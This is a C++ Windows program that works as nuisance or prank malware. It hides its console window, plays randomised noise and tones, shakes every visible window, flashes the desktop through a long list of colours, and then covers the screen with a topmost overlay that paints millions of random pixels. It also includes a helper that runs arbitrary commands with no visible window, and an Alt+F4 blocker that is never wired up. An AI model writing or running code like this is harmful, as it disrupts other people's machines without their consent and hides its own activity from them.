#include <windows.h>
#include <string>
#include <filesystem>
#include <mmsystem.h>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <thread>
#include <atomic>

#define MOVE_RIGHT -1
#define MOVE_LEFT  1

#pragma comment(lib, "winmm.lib")

std::atomic<bool> keepRunning(true);
std::atomic<bool> triggerSpecialEffects(false);

using namespace std::chrono;

HINSTANCE hInst;
HWND hwnd;
HDC hdc;
int width, height;

void SetScreenColor(HWND hwnd, COLORREF color);
void ExecuteHiddenCommand(const char* command);
void FakeCrash();

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_SYSKEYDOWN: // Handle Alt + F4
            if (wParam == VK_F4 && GetAsyncKeyState(VK_MENU)) {
                return 0; // Prevent Alt + F4
            }
        break;
        case WM_DESTROY:
            PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}



void SetScreenColor(HWND hwnd, COLORREF color) {
    HDC hdc = GetDC(hwnd);
    RECT rect;
    GetClientRect(hwnd, &rect);
    HBRUSH brush = CreateSolidBrush(color);
    FillRect(hdc, &rect, brush);
    DeleteObject(brush);
    ReleaseDC(hwnd, hdc);
}

void ExecuteHiddenCommand(const char* command) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(
            NULL,               // No module name (use command line)
            (LPSTR)command,     // Command line
            NULL,               // Process handle not inheritable
            NULL,               // Thread handle not inheritable
            FALSE,              // Set handle inheritance to FALSE
            CREATE_NO_WINDOW,   // No window for this process
            NULL,               // Use parent's environment block
            NULL,               // Use parent's starting directory
            &si,                // Pointer to STARTUPINFO structure
            &pi)                // Pointer to PROCESS_INFORMATION structure
        ) {
        MessageBox(NULL, "Failed to execute command", "Error", MB_OK | MB_ICONERROR);
        return;
        }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

COLORREF GetRandomColor() {
    return RGB(rand() % 256, rand() % 256, rand() % 256);
}

void CreateGlitchEffect() {
    for (int i = 0; i < 50000000; i++) {
        int x = rand() % width;
        int y = rand() % height;
        SetPixel(hdc, x, y, GetRandomColor());
    }
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE:
            srand(time(0));
        hdc = GetDC(hwnd);
        break;
        case WM_PAINT:
                CreateGlitchEffect();
        ValidateRect(hwnd, NULL);
        break;
        case WM_DESTROY:
            PostQuitMessage(0);
        break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

void shakeWindow(int moveDirection, HWND hWindow) {
    RECT windowRect;

    GetWindowRect(hWindow, &windowRect);

    int moveOffset = rand() % 15 + 5;
    int shakeDirection = (rand() % 2 == 0) ? MOVE_LEFT : MOVE_RIGHT;

    LONG moveAxisX = windowRect.left + (shakeDirection * moveOffset);
    SetWindowPos(hWindow, NULL, moveAxisX, windowRect.top, 0, 0, SWP_NOSIZE);
}


BOOL CALLBACK EnumWindowsProc(HWND hWindow, LPARAM lParam) {
    // Ignore invisible or non-visible windows
    if (IsWindowVisible(hWindow)) {
        shakeWindow(*(int*)lParam, hWindow);
    }
    return TRUE;
}

void GenerateRandomPixels() {
    RECT screenRect;
    GetWindowRect(GetDesktopWindow(), &screenRect);
    width = screenRect.right - screenRect.left;
    height = screenRect.bottom - screenRect.top;

    WNDCLASSEXA wc = { sizeof(WNDCLASSEXA), CS_HREDRAW | CS_VREDRAW, WndProc, 0, 0, hInst, NULL, NULL, (HBRUSH)(COLOR_WINDOW+1), NULL, "GlitchOverlayClass", NULL };
    RegisterClassExA(&wc);

    hwnd = CreateWindowExA(WS_EX_LAYERED | WS_EX_TOPMOST | WS_EX_TOOLWINDOW, "GlitchOverlayClass", "Visual Glitch Overlay", WS_POPUP, 0, 0, width, height, NULL, NULL, hInst, NULL);

    if (!hwnd) {
        MessageBoxA(NULL, "Window Creation Failed!", "Error", MB_ICONEXCLAMATION | MB_OK);
    }

    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);

    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 128, LWA_ALPHA);

    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void generateSquareWave(unsigned char* buffer, size_t size, int frequency, int sampleRate) {
    for (size_t i = 0; i < size; ++i) {
        double t = static_cast<double>(i) / sampleRate;
        buffer[i] = (sin(2 * M_PI * frequency * t) > 0) ? 255 : 0;
    }
}

void generateSawtoothWave(unsigned char* buffer, size_t size, int frequency, int sampleRate) {
    for (size_t i = 0; i < size; ++i) {
        double t = static_cast<double>(i) / sampleRate;
        buffer[i] = static_cast<unsigned char>(255 * (fmod(frequency * t, 1.0)));
    }
}

void generateSineWave(unsigned char* buffer, size_t size, int frequency, int sampleRate) {
    for (size_t i = 0; i < size; ++i) {
        double t = static_cast<double>(i) / sampleRate;
        buffer[i] = static_cast<unsigned char>(127 + 127 * sin(2 * M_PI * frequency * t));
    }
}

void generateRandomNoise(unsigned char* buffer, size_t size) {
    for (size_t i = 0; i < size; ++i) {
        buffer[i] = rand() % 256;
    }
}

void generateRandomizedAudio(unsigned char* buffer, size_t size, int sampleRate) {
    size_t i = 0;
    while (i < size) {
        int chunkSize = rand() % (sampleRate / 4);
        int type = triggerSpecialEffects ? (rand() % 4) : (rand() % 2);

        if (type == 0) {
            int frequency = 200 + rand() % 1800;
            size_t chunkEnd = std::min(i + chunkSize, size);
            generateSineWave(buffer + i, chunkEnd - i, frequency, sampleRate);
        } else if (type == 1) {
            size_t chunkEnd = std::min(i + chunkSize, size);
            generateRandomNoise(buffer + i, chunkEnd - i);
        } else if (type == 2) {
            int frequency = 300 + rand() % 1500;
            size_t chunkEnd = std::min(i + chunkSize, size);
            generateSquareWave(buffer + i, chunkEnd - i, frequency, sampleRate);
        } else if (type == 3) {
            int frequency = 300 + rand() % 1500;
            size_t chunkEnd = std::min(i + chunkSize, size);
            generateSawtoothWave(buffer + i, chunkEnd - i, frequency, sampleRate);
        }
        i += chunkSize;
    }
}

void playRandomAudio() {
    srand(static_cast<unsigned int>(time(nullptr)));

    const int SAMPLE_RATE = 44100;
    const int BUFFER_SIZE = SAMPLE_RATE * 1;

    WAVEFORMATEX waveFormat = {};
    waveFormat.wFormatTag = WAVE_FORMAT_PCM;
    waveFormat.nChannels = 1;
    waveFormat.nSamplesPerSec = SAMPLE_RATE;
    waveFormat.nAvgBytesPerSec = SAMPLE_RATE;
    waveFormat.nBlockAlign = 1;
    waveFormat.wBitsPerSample = 8;

    HWAVEOUT hWaveOut;
    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        return;
    }

    unsigned char* audioData = new unsigned char[BUFFER_SIZE];
    WAVEHDR waveHeader = {};

    while (keepRunning) {
        generateRandomizedAudio(audioData, BUFFER_SIZE, SAMPLE_RATE);

        waveHeader.lpData = reinterpret_cast<LPSTR>(audioData);
        waveHeader.dwBufferLength = BUFFER_SIZE;
        waveHeader.dwFlags = 0;
        waveOutPrepareHeader(hWaveOut, &waveHeader, sizeof(WAVEHDR));

        waveOutWrite(hWaveOut, &waveHeader, sizeof(WAVEHDR));

        while (!(waveHeader.dwFlags & WHDR_DONE)) {
            Sleep(10);
        }

        waveOutUnprepareHeader(hWaveOut, &waveHeader, sizeof(WAVEHDR));
    }

    waveOutClose(hWaveOut);
    delete[] audioData;
}

void startRandomAudio() {
    std::thread audioThread(playRandomAudio);
    audioThread.detach();
}

int main(int argc, char** argv) {
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
    HINSTANCE hInstance = GetModuleHandle(NULL);

    srand((unsigned int)time(NULL));
    int currentHoverDirection = MOVE_LEFT;

    auto start_time = steady_clock::now();
    auto next_function1_time = steady_clock::now();

    startRandomAudio();

    while (true) {
        auto current_time = steady_clock::now();
        if (duration_cast<milliseconds>(current_time - next_function1_time).count() >= 35) {
            EnumWindows(EnumWindowsProc, (LPARAM)&currentHoverDirection);
            currentHoverDirection = (currentHoverDirection == MOVE_LEFT) ? MOVE_RIGHT : MOVE_LEFT;
            next_function1_time = current_time;
        }

        if (duration_cast<seconds>(current_time - start_time).count() >= 23) {
            HWND hwnd = GetDesktopWindow();
            COLORREF colors[] = { RGB(255, 0, 0), RGB(0, 255, 0), RGB(0, 0, 255), RGB(123, 45, 67), RGB(255, 123, 0), RGB(34, 178, 255), RGB(200, 100, 150), RGB(75, 255, 25), RGB(0, 0, 0), RGB(255, 255, 0), RGB(100, 0, 200), RGB(150, 50, 100), RGB(240, 30, 90), RGB(15, 45, 255), RGB(178, 255, 102), RGB(80, 80, 80), RGB(255, 200, 0), RGB(0, 150, 255), RGB(180, 0, 80), RGB(255, 128, 64), RGB(100, 100, 0), RGB(25, 25, 255), RGB(0, 200, 0), RGB(128, 128, 128), RGB(255, 64, 128), RGB(0, 50, 100), RGB(102, 204, 255), RGB(0, 0, 255), RGB(255, 0, 64), RGB(0, 128, 128), RGB(220, 40, 90), RGB(128, 255, 128), RGB(150, 150, 0), RGB(0, 0, 0), RGB(255, 255, 255), RGB(50, 255, 50), RGB(60, 90, 120), RGB(200, 0, 200), RGB(75, 25, 100), RGB(255, 102, 153), RGB(250, 250, 0), RGB(0, 60, 120), RGB(123, 123, 123), RGB(245, 245, 245), RGB(128, 64, 0), RGB(0, 0, 0), RGB(180, 255, 180), RGB(255, 204, 204), RGB(153, 51, 255), RGB(255, 140, 0), RGB(0, 128, 255), RGB(140, 70, 180) };
            int colorCount = sizeof(colors) / sizeof(colors[0]);

            for (int i = 0; i < 1; i++) {
                for (int j = 0; j < colorCount; j++) {
                    SetScreenColor(hwnd, colors[j]);
                    Sleep(5);
                }
            }
            SetScreenColor(hwnd, RGB(255, 255, 255));
            triggerSpecialEffects = !triggerSpecialEffects;
            GenerateRandomPixels();
            keepRunning = false;
            break;
        }
        Sleep(1);
    }
    return 0;
}
